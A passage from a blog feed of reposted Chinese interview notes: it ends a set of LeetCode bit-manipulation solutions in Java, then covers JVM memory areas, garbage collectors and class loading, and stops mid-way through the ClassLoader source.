j++) &#123; if ((val[i] &amp; val[j]) == 0) &#123; ret = Math.max(ret, words[i].length() * words[j].length()); &#125; &#125; &#125; return ret;&#125; 统计从 0 ~ n 每个数的二进制表示中 1 的个数 338. Counting Bits (Medium) 对于数字 6(110)，它可以看成是 4(100) 再加一个 2(10)，因此 dp[i] = dp[i&amp;(i-1)] + 1; 1234567public int[] countBits(int num) &#123; int[] ret = new int[num + 1]; for(int i = 1; i &lt;= num; i++)&#123; ret[i] = ret[i&amp;(i-1)] + 1; &#125; return ret;&#125; 参考资料 Leetcode Weiss M A, 冯舜玺. 数据结构与算法分析——C 语言描述[J]. 2004. Sedgewick R. Algorithms[M]. Pearson Education India, 1988. 何海涛, 软件工程师. 剑指 Offer: 名企面试官精讲典型编程题[M]. 电子工业出版社, 2014. 《编程之美》小组. 编程之美[M]. 电子工业出版社, 2008. 左程云. 程序员代码面试指南[M]. 电子工业出版社, 2015.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 虚拟机]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E8%99%9A%E6%8B%9F%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[一、运行时数据区域 程序计数器 虚拟机栈 本地方法栈 堆 方法区 运行时常量池 直接内存 二、垃圾收集 判断一个对象是否存活 垃圾收集算法 垃圾收集器 内存分配与回收策略 三、类加载机制 类的生命周期 类初始化时机 类加载过程 类加载器 参考资料 一、运行时数据区域 程序计数器记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。 虚拟机栈每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。每一个方法从调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。 可以通过 -Xss 这个虚拟机参数来指定一个程序的 Java 虚拟机栈内存大小： 1java -Xss=512M HackTheJava 该区域可能抛出以下异常： 当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常； 栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。 本地方法栈本地方法不是用 Java 实现，对待这些方法需要特别处理。 与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。 堆所有对象实例都在这里分配内存。 是垃圾收集的主要区域（”GC 堆”）。现代的垃圾收集器基本都是采用分代收集算法，主要思想是针对不同的对象采取不同的垃圾回收算法。虚拟机把 Java 堆分成以下三块： 新生代（Young Generation） 老年代（Old Generation） 永久代（Permanent Generation） 当一个对象被创建时，它首先进入新生代，之后有可能被转移到老年代中。 新生代存放着大量的生命很短的对象，因此新生代在三个区域中垃圾回收的频率最高。为了更高效地进行垃圾回收，把新生代继续划分成以下三个空间： Eden（伊甸园） From Survivor（幸存者） To Survivor Java 堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。 可以通过 -Xms 和 -Xmx 两个虚拟机参数来指定一个程序的 Java 堆内存大小，第一个参数设置初始值，第二个参数设置最大值。 1java -Xms=1M -Xmx=2M HackTheJava 方法区用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 和 Java 堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。 对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。 JDK 1.7 之前，HotSpot 虚拟机把它当成永久代来进行垃圾回收，JDK 1.8 之后，取消了永久代，用 metaspace（元数据）区替代。 运行时常量池运行时常量池是方法区的一部分。 Class 文件中的常量池（编译器生成的各种字面量和符号引用）会在类加载后被放入这个区域。 除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。 直接内存在 JDK 1.4 中新加入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在 Java 堆和 Native 堆中来回复制数据。 二、垃圾收集程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后也会消失，因此不需要对这三个区域进行垃圾回收。垃圾回收主要是针对 Java 堆和方法区进行。 判断一个对象是否存活1. 引用计数算法给对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数不为 0 的对象仍然存活。 两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。 12345678910public class ReferenceCountingGC &#123; public Object instance = null; public static void main(String[] args) &#123; ReferenceCountingGC objectA = new ReferenceCountingGC(); ReferenceCountingGC objectB = new ReferenceCountingGC(); objectA.instance = objectB; objectB.instance = objectA; &#125;&#125; 正因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。 2. 可达性分析算法通过 GC Roots 作为起始点进行搜索，能够到达到的对象都是存活的，不可达的对象可被回收。 Java 虚拟机使用该算法来判断对象是否可被回收，在 Java 中 GC Roots 一般包含以下内容： 虚拟机栈中引用的对象 本地方法栈中引用的对象 方法区中类静态属性引用的对象 方法区中的常量引用的对象 3. 引用类型无论是通过引用计算算法判断对象的引用数量，还是通过可达性分析算法判断对象是否可达，判定对象是否可被回收都与引用有关。 Java 具有四种强度不同的引用类型。 （一）强引用 被强引用关联的对象不会被垃圾收集器回收。 使用 new 一个新对象的方式来创建强引用。 1Object obj = new Object(); （二）软引用 被软引用关联的对象，只有在内存不够的情况下才会被回收。 使用 SoftReference 类来创建软引用。 123Object obj = new Object();SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj);obj = null; // 使对象只被软引用关联 （三）弱引用 被弱引用关联的对象一定会被垃圾收集器回收，也就是说它只能存活到下一次垃圾收集发生之前。 使用 WeakReference 类来实现弱引用。 123Object obj = new Object();WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj);obj = null; WeakHashMap 的 Entry 继承自 WeakReference，主要用来实现缓存。 1private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; Tomcat 中的 ConcurrentCache 就使用了 WeakHashMap 来实现缓存功能。ConcurrentCache 采取的是分代缓存，经常使用的对象放入 eden 中，而不常用的对象放入 longterm。eden 使用 ConcurrentHashMap 实现，longterm 使用 WeakHashMap，保证了不常使用的对象容易被回收。 1234567891011121314151617181920212223242526272829303132public final class ConcurrentCache&lt;K, V&gt; &#123; private final int size; private final Map&lt;K, V&gt; eden; private final Map&lt;K, V&gt; longterm; public ConcurrentCache(int size) &#123; this.size = size; this.eden = new ConcurrentHashMap&lt;&gt;(size); this.longterm = new WeakHashMap&lt;&gt;(size); &#125; public V get(K k) &#123; V v = this.eden.get(k); if (v == null) &#123; v = this.longterm.get(k); if (v != null) this.eden.put(k, v); &#125; return v; &#125; public void put(K k, V v) &#123; if (this.eden.size() &gt;= size) &#123; this.longterm.putAll(this.eden); this.eden.clear(); &#125; this.eden.put(k, v); &#125;&#125; （四）虚引用 又称为幽灵引用或者幻影引用。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用取得一个对象实例。 为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知。 使用 PhantomReference 来实现虚引用。 123Object obj = new Object();PhantomReference&lt;Object&gt; pf = new PhantomReference&lt;Object&gt;(obj);obj = null; 4. 方法区的回收因为方法区主要存放永久代对象，而永久代对象的回收率比新生代差很多，因此在方法区上进行回收性价比不高。 主要是对常量池的回收和对类的卸载。 类的卸载条件很多，需要满足以下三个条件，并且满足了也不一定会被卸载： 该类所有的实例都已经被回收，也就是 Java 堆中不存在该类的任何实例。 加载该类的 ClassLoader 已经被回收。 该类对应的 java.lang.Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。 可以通过 -Xnoclassgc 参数来控制是否对类进行卸载。 在大量使用反射、动态代理、CGLib 等 ByteCode 框架、动态生成 JSP 以及 OSGi 这类频繁自定义 ClassLoader 的场景都需要虚拟机具备类卸载功能，以保证不会出现内存溢出。 5. finalize()finalize() 类似 C++ 的析构函数，用来做关闭外部资源等工作。但是 try-finally 等方式可以做的更好，并且该方法运行代价高昂，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。 当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能通过在该方法中让对象重新被引用，从而实现自救。自救只能进行一次，如果回收的对象之前调用了 finalize() 方法自救，后面回收时不会调用 finalize() 方法。 垃圾收集算法1. 标记 - 清除 将存活的对象进行标记，然后清理掉未被标记的对象。 不足： 标记和清除过程效率都不高； 会产生大量不连续的内存碎片，导致无法给大对象分配内存。 2. 标记 - 整理 让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 3. 复制 将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。 主要不足是只使用了内存的一半。 现在的商业虚拟机都采用这种收集算法来回收新生代，但是并不是将内存划分为大小相等的两块，而是分为一块较大的 Eden 空间和两块较小的 Survivor 空间，每次使用 Eden 空间和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象一次性复制到另一块 Survivor 空间上，最后清理 Eden 和使用过的那一块 Survivor。HotSpot 虚拟机的 Eden 和 Survivor 的大小比例默认为 8:1，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 空间就不够用了，此时需要依赖于老年代进行分配担保，也就是借用老年代的空间存储放不下的对象。 4. 分代收集现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。 一般将 Java 堆分为新生代和老年代。 新生代使用：复制算法 老年代使用：标记 - 清理 或者 标记 - 整理 算法 垃圾收集器 以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。 单线程与并行（多线程）：单线程指的是垃圾收集器只使用一个线程进行收集，而并行使用多个线程。 串行与并发：串行指的是垃圾收集器与用户程序交替执行，这意味着在执行垃圾收集的时候需要停顿用户程序；并发指的是垃圾收集器和用户程序同时执行。除了 CMS 和 G1 之外，其它垃圾收集器都是以串行的方式执行。 1. Serial 收集器 Serial 翻译为串行，也就是说它以串行的方式执行。 它是单线程的收集器，只会使用一个线程进行垃圾收集工作。 它的优点是简单高效，对于单个 CPU 环境来说，由于没有线程交互的开销，因此拥有最高的单线程收集效率。 它是 Client 模式下的默认新生代收集器，因为在用户的桌面应用场景下，分配给虚拟机管理的内存一般来说不会很大。Serial 收集器收集几十兆甚至一两百兆的新生代停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿是可以接受的。 2. ParNew 收集器 它是 Serial 收集器的多线程版本。 是 Server 模式下的虚拟机首选新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合工作。 默认开启的线程数量与 CPU 数量相同，可以使用 -XX:ParallelGCThreads 参数来设置线程数。 3. Parallel Scavenge 收集器与 ParNew 一样是并行的多线程收集器。 其它收集器关注点是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户代码的时间占总时间的比值。 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 提供了两个参数用于精确控制吞吐量，分别是控制最大垃圾收集停顿时间 -XX:MaxGCPauseMillis 参数以及直接设置吞吐量大小的 -XX:GCTimeRatio 参数（值为大于 0 且小于 100 的整数）。缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。 还提供了一个参数 -XX:+UseAdaptiveSizePolicy，这是一个开关参数，打开参数后，就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种方式称为 GC 自适应的调节策略（GC Ergonomics）。 4. Serial Old 收集器 是 Serial 收集器的老年代版本，也是给 Client 模式下的虚拟机使用。如果用在 Server 模式下，它有两大用途： 在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。 作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。 5. Parallel Old 收集器 是 Parallel Scavenge 收集器的老年代版本。 在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。 6. CMS 收集器 CMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。 特点：并发收集、低停顿。 分为以下四个流程： 初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。 并发标记：进行 GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。 重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。 并发清除：不需要停顿。 在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。 具有以下缺点： 吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。 无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。 标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。 7. G1 收集器G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。 Java 堆被分为新生代、老年代和永久代，其它收集器进行收集的范围都是整个新生代或者老生代，而 G1 可以直接对新生代和永久代一起回收。 G1 把堆划分成多个大小相等的独立区域（Region），新生代和永久代不再物理隔离。 通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。 每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。 如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤： 初始标记 并发标记 最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。 筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。 具备如下特点： 空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。 可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。 更详细内容请参考：Getting Started with the G1 Garbage Collector 8. 比较 收集器 单线程/并行 串行/并发 新生代/老年代 收集算法 目标 适用场景 Serial 单线程 串行 新生代 复制 响应速度优先 单 CPU 环境下的 Client 模式 Serial Old 单线程 串行 老年代 标记-整理 响应速度优先 单 CPU 环境下的 Client 模式、CMS 的后备预案 ParNew 并行 串行 新生代 复制算法 响应速度优先 多 CPU 环境时在 Server 模式下与 CMS 配合 Parallel Scavenge 并行 串行 新生代 复制算法 吞吐量优先 在后台运算而不需要太多交互的任务 Parallel Old 并行 串行 老年代 标记-整理 吞吐量优先 在后台运算而不需要太多交互的任务 CMS 并行 并发 老年代 标记-清除 响应速度优先 集中在互联网站或 B/S 系统服务端上的 Java 应用 G1 并行 并发 新生代 + 老年代 标记-整理 + 复制算法 响应速度优先 面向服务端应用，将来替换 CMS 内存分配与回收策略1. Minor GC 和 Full GC Minor GC：发生在新生代上，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。 Full GC：发生在老年代上，老年代对象其存活时间长，因此 Full GC 很少执行，执行速度会比 Minor GC 慢很多。 2. 内存分配策略（一）对象优先在 Eden 分配 大多数情况下，对象在新生代 Eden 区分配，当 Eden 区空间不够时，发起 Minor GC。 （二）大对象直接进入老年代 大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。 经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。 -XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 区和 Survivor 区之间的大量内存复制。 （三）长期存活的对象进入老年代 为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。 -XX:MaxTenuringThreshold 用来定义年龄的阈值。 （四）动态对象年龄判定 虚拟机并不是永远地要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 区中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。 （五）空间分配担保 在发生 Minor GC 之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的；如果不成立的话虚拟机会查看 HandlePromotionFailure 设置值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC，尽管这次 Minor GC 是有风险的；如果小于，或者 HandlePromotionFailure 设置不允许冒险，那这时也要改为进行一次 Full GC。 3. Full GC 的触发条件对于 Minor GC，其触发条件非常简单，当 Eden 区空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件： （一）调用 System.gc() 只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。 （二）老年代空间不足 老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。 为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。 （三）空间分配担保失败 使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。具体内容请参考上面的第五小节。 （四）JDK 1.7 及以前的永久代空间不足 在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据，当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError。为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。 （五）Concurrent Mode Failure 执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（有时候“空间不足”是指 CMS GC 当前的浮动垃圾过多导致暂时性的空间不足），便会报 Concurrent Mode Failure 错误，并触发 Full GC。 三、类加载机制类是在运行期间动态加载的。 类的生命周期 包括以下 7 个阶段： 加载（Loading） 验证（Verification） 准备（Preparation） 解析（Resolution） 初始化（Initialization） 使用（Using） 卸载（Unloading） 其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。 类初始化时机虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随之发生）： 遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。 使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类； 当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化； 以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括： 通过子类引用父类的静态字段，不会导致子类初始化。 1System.out.println(SubClass.value); // value 字段在 SuperClass 中定义 通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。 1SuperClass[] sca = new SuperClass[10]; 常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。 1System.out.println(ConstClass.HELLOWORLD); 类加载过程包含了加载、验证、准备、解析和初始化这 5 个阶段。 1. 加载加载是类加载的一个阶段，注意不要混淆。 加载过程完成以下三件事： 通过一个类的全限定名来获取定义此类的二进制字节流。 将这个字节流所代表的静态存储结构转化为方法区的运行时存储结构。 在内存中生成一个代表这个类的 Class 对象，作为方法区这个类的各种数据的访问入口。 其中二进制字节流可以从以下方式中获取： 从 ZIP 包读取，这很常见，最终成为日后 JAR、EAR、WAR 格式的基础。 从网络中获取，这种场景最典型的应用是 Applet。 运行时计算生成，这种场景使用得最多得就是动态代理技术，在 java.lang.reflect.Proxy 中，就是用了 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。 由其他文件生成，典型场景是 JSP 应用，即由 JSP 文件生成对应的 Class 类。 从数据库读取，这种场景相对少见，例如有些中间件服务器（如 SAP Netweaver）可以选择把程序安装到数据库中来完成程序代码在集群间的分发。… 2. 验证确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 文件格式验证：验证字节流是否符合 Class 文件格式的规范，并且能被当前版本的虚拟机处理。 元数据验证：对字节码描述的信息进行语义分析，以保证其描述的信息符合 Java 语言规范的要求。 字节码验证：通过数据流和控制流分析，确保程序语义是合法、符合逻辑的。 符号引用验证：发生在虚拟机将符号引用转换为直接引用的时候，对类自身以外（常量池中的各种符号引用）的信息进行匹配性校验。 3. 准备类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。 实例变量不会在这阶段分配内存，它将会在对象实例化时随着对象一起分配在 Java 堆中。（实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次） 初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。 1public static int value = 123; 如果类变量是常量，那么会按照表达式来进行初始化，而不是赋值为 0。 1public static final int value = 123; 4. 解析将常量池的符号引用替换为直接引用的过程。 5. 初始化初始化阶段才真正开始执行类中的定义的 Java 程序代码。初始化阶段即虚拟机执行类构造器 &lt;clinit&gt;() 方法的过程。 在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。 &lt;clinit&gt;() 方法具有以下特点： 是由编译器自动收集类中所有类变量的赋值动作和静态语句块（static{} 块）中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码： 1234567public class Test &#123; static &#123; i = 0; // 给变量赋值可以正常编译通过 System.out.print(i); // 这句编译器会提示“非法向前引用” &#125; static int i = 1;&#125; 与类的构造函数（或者说实例构造器 &lt;init&gt;()）不同，不需要显式的调用父类的构造器。虚拟机会自动保证在子类的 &lt;clinit&gt;() 方法运行之前，父类的 &lt;clinit&gt;() 方法已经执行结束。因此虚拟机中第一个执行 &lt;clinit&gt;() 方法的类肯定为 java.lang.Object。 由于父类的 &lt;clinit&gt;() 方法先执行，也就意味着父类中定义的静态语句块要优于子类的变量赋值操作。例如以下代码： 1234567891011121314static class Parent &#123; public static int A = 1; static &#123; A = 2; &#125;&#125;static class Sub extends Parent &#123; public static int B = A;&#125;public static void main(String[] args) &#123; System.out.println(Sub.B); // 输出结果是父类中的静态变量 A 的值，也就是 2。&#125; &lt;clinit&gt;() 方法对于类或接口不是必须的，如果一个类中不包含静态语句块，也没有对类变量的赋值操作，编译器可以不为该类生成 &lt;clinit&gt;() 方法。 接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 &lt;clinit&gt;() 方法。但接口与类不同的是，执行接口的 &lt;clinit&gt;() 方法不需要先执行父接口的 &lt;clinit&gt;() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 &lt;clinit&gt;() 方法。 虚拟机会保证一个类的 &lt;clinit&gt;() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 &lt;clinit&gt;() 方法，其它线程都会阻塞等待，直到活动线程执行 &lt;clinit&gt;() 方法完毕。如果在一个类的 &lt;clinit&gt;() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。 类加载器在 Java 虚拟机外部实现，以便让应用程序自己决定如何去获取所需要的类。 1. 类与类加载器两个类相等：类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。 这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。 2. 类加载器分类从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器： 启动类加载器（Bootstrap ClassLoader），这个类加载器用 C++ 实现，是虚拟机自身的一部分； 所有其他类的加载器，这些类由 Java 实现，独立于虚拟机外部，并且全都继承自抽象类 java.lang.ClassLoader。 从 Java 开发人员的角度看，类加载器可以划分得更细致一些： 启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 &lt;JAVA_HOME&gt;\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。 扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将 &lt;JAVA_HOME&gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。 应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 3. 双亲委派模型应用程序都是由三种类加载器相互配合进行加载的，如果有必要，还可以加入自己定义的类加载器。 下图展示的类加载器之间的层次关系，称为类加载器的双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。这里类加载器之间的父子关系一般通过组合（Composition）关系来实现，而不是通过继承（Inheritance）的关系实现。 （一）工作过程 一个类加载器首先将类加载请求传送到父类加载器，只有当父类加载器无法完成类加载请求时才尝试加载。 （二）好处 使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。 例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 的类并放到 ClassPath 中，程序可以编译通过。因为双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。正因为 rt.jar 中的 Object 优先级更高，因为程序中所有的 Object 都是这个 Object。 （三）实现 以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。 1234567891011121314151617181920212223242526272829303132333435363738394041public abstract class ClassLoader &#123; // The parent class loader for delegation private final ClassLoader parent; public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false); &#125; protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // 